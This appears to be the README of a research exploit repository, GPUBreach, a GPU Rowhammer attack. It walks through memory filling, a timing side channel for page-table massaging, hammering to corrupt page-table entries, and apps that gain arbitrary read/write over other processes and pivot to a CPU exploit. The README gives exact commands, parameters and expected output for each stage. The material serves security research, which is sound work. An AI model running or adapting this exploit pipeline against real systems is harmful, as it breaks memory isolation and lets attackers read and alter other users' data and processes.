
### Project Structure

```txt
📄 gpubreach.py: Python script to help navigate GPUBreach's various stages and example apps.
📂 /src
├── 📂 /gpuhammer: contains the GPUHammer code, the current "HAMMER_ROOT". Shares the "src/include".
├── 📂 /include: contains the core code to launch GPUHammer and the utils for GPUBreach massaging
│   └── 📄 rh_*: Directly ported from GPUHammer to launch Rowhammer with a minimal amount of code.
│   └── 📄 gpubreach_util.cu/h: CUDA Kernels and utility C++ functions for massaging.

├── 📄 CMakeList.txt
├── 📄 gpubreach_main.cu: main function to run different steps of GPUBreach.
├── 📄 app_demo.cu: Part of the GPUBreach demo program, which will try to read and write another process's data.
├── 📄 app_cpu_exploit.cu: GPUBreach program used to modify the CPU-exploit's pointer to the IOVA region
├── 📄 app_transfercu: GPUBreach program used to transfer arbitrary rw to another process.
├── 📄 s1_allocallmem.*: Step 1 of GPUBreach, using the UVM timing side-channel to get the system memory limit.
|
├── 📄 s2_firstRegion.*: Step 2 of GPUBreach, using UVM timing side-channel and 4KB page tables to massage PT regions to flippy locations.
|
├── 📄 s3_firstRegion_hammer.*: Step 3 of GPUBreach, fill the new PT region with PTEs and perform GPUHammer. Repeated multiple times on random PTEs if corruption is not observed.
|
└── 📄 s4_secondRegion.*: Step 4 of GPUBreach, same as sc_firstRegion.
```

### Important
For Row Set consistency purposes, GPUBreach and GPUHammer code shares the same include folder. The additional kernels from GPUBreach can alter the Row Set due to additional memory reserved.

### Step 0.1 Compile
```bash
# Make GPUHammer
cd $HAMMER_ROOT/src
rm -rf out
cmake -S . -B out/build
cd out/build && make -j 
cd $BREACH_ROOT

# Make GPUBreach
cd src/
rm -rf out
cmake -S . -B out
cd out && make -j
```
# Display available tasks
python3 gpubreach.py -h

# Display usage to the specific task
python3 gpubreach.py <task> -h
```

### Step 0.2 Bit-flip Configuration File

Before the attack can succeed, you need to find a suitable bit-flip on your machine. You can use the `gpuahammer/` we provided, or other attack patterns from your own directories for the search. Make sure they still follow the same structure and modify `HAMMER_ROOT` to point to your own directory instead.

__Configuration File__: For ease of use, we provide the feature of _bit-flip configuration files_, for both "A1" and "B1" flips, covering the cases where the aggressor is on the left or right of the victim page. They are very similar to how you initialize GPUHammer's bash scripts.


Please view the sample config files in the `flip_config_sample\` folder on how to construct your own, which we provided with comprehensive comments. If necessary, `load_rowhammer_bitflip_info()` contains more details on how they are used exactly.

#### Edge cases currently do not cover:
1. **Flip in 0th entry of the 32-entry 64KB page table**: We evict the first entry out to generate 64KB pages, so the entry becomes invalid. However, one can modify the eviction to evict another entry instead.

2. **Critical Aggressor in or partially in the same 2MB page as Victim**: If both critical aggressors are exactly in the same page,  the bit-flip cannot be used. But for the partial case, if the victim 256B that flips is not on the same page, the attack can still succeed by selecting the aggressor and victim pages more carefully.

### Step 1. Fill GPU Memory
We recommend enabling the verbose option `-v` when testing. Given that different GPUs may have different timing, we run the following to get a sense of the timing spike:

```bash
python3 gpubreach.py all_mem_test -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```

where `-t 0.2` means a threshold of 0.2ms, which we classify any time above this **threshold** as a timing spike, and `15` is how many initial measurements to **skip**, given usually the first few measurements take longer when the GPU is warming up. The `-c` is the bit-flip configuration file, currently pointing to the A1 flip.

In general, this **threshold** should be correct, and you will see:
```txt
24106 Recorded time: 0.059685 ms
24107 Recorded time: 0.060716 ms
24108 Recorded time: 0.060145 ms
24109 Recorded time: 0.332168 ms
24110 Recorded time: 0.323271 ms
24111 Recorded time: 0.277172 ms
Spikes observed after allocation index 24109
This means you should perform at most 24109 number of allocations to avoid eviction
Pass 24109 as the limit in subsequent experiments.
```

If not, inspect the output of the time to observe **consecutive timing spikes** and see what your GPU's eviction timing threshold is.

You can then run this command to control the number of allocations, which is what the future steps will use.
```bash
python3 gpubreach.py all_mem --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```
The output should stop at 24108, as this is the maximum memory before any evictions. If you increase `--n_step1`, you should expect to see the same behavior as before.

### Step 2. Massaging PT Region
Taking the number we found from **Step 1**, we use it to perform the massaging step. We will test that the timing side-channel with 4KB pages works as intended by running the test command below:

```bash
python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```

The final output should not be longer than 1024 (but around 800-900 ish), as we generate PT regions very fast. If it is going longer, your **threshold** may be too high; lower it, or see below how it is supposed to behave:

```txt
...
316 New PT time: 0.024847 ms
317 New PT time: 0.024817 ms
318 New PT time: 0.247276 ms
Found First Allocation Spike: **318**., Time:  0.247276.
Next Allocation Spike Id:  **826**.

...
824 New PT time: 0.024828 ms
825 New PT time: 0.02575 ms
826 New PT time: 0.242807 ms
Expected: id **826**. Found Spike id: **826**.
```

There is no direct way to verify whether the massaging worked directly after this point. However, if one have a page table dumper installed like `https://github.com/0x5ec1ab/gpu-tlb/tree/main/extractor`, you can check whether a PT region is resident where you expect it to.

Run the following to see what it will look like in the complete pipeline:
```bash
python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```

Should look like this:
```txt
821 New PT time: 0.022894 ms
822 New PT time: 0.035759 ms
(Step 2 Success) First PT Region Generated: Press Enter Key to continue...
```

### Step 3: 

Once you believe (or have verified) the massaging is working as intended, we will now move to filling the PT region with PTEs and hammer it. see whether our attack really worked:

```bash
python3 gpubreach.py first_region_atk --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```

You should usually get it on the first try on our machine.
```txt
First PT Region Filled Round 0 Completed
Filling In Identifying Information for Each Page... 
Identifying Data Placed, Hammer Starts...
Hammer Done, Finding Corruption... (Rare: If taking longer than 5s, CTRL + C and stop the program)

After 1 repeats
Corrupted: 0x7ef8476e0000. Victim: 0x7ef8466e0000
Found victim id.
(Step 3 Success) Found Corrupted PFN Destination: Press Enter Key to continue...
```

### Step 4: 
This step does the same thing as **Step 2** and completes the exploit.

```bash
python3 gpubreach.py second_region --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -v
```

It will also print out a bunch of PTEs of 2MB cudaMalloced memories, which aren't available for normal users, showing that we have access to modify them.

```txt
4f90: 1 0 e6 5 0 0 0 6 
4fa0: 1 0 e8 5 0 0 0 6 
4fb0: 1 0 ea 5 0 0 0 6 
(Step 4 Success) Second PT Region Now in Attacker Controlled Region. We printed out the PTEs of the controlled page and provided relevant pointers to interact with them in struct S4_ExploitComplete.
Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' means they are the 4KB PTEs.
Press Enter Key to continue...
```

### Demo/CPU-exploit APP:

To run these two applications, the commands are very similar.
```bash
# Demo
python3 gpubreach.py app_demo --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"

# CPU-exploit
python3 gpubreach.py app_cpu_exploit --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"
```

### Transfer APP:

To transfer arbitrary RW to another process, you can use this command and replace `<non-blocking program>` with a non-blocking program (e.g., with nohup), or you may modify app_transfer to be similar to the behavior of CPU-exploit, where you manually start up programs. The requirement for the program is just to place 0x646464... in the arbitrary RW pointer you want, and 0x464646... to the page table pointer that you want to use to modify mapping. See `data_scripts/ml_exploit/torch_attacker.cu` and `data_scripts/cupqc_exploit/attacker_dumper.cu` as example.
```bash
# Demo
python3 gpubreach.py app_transfer --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini" -a "<non-blocking program>"
```


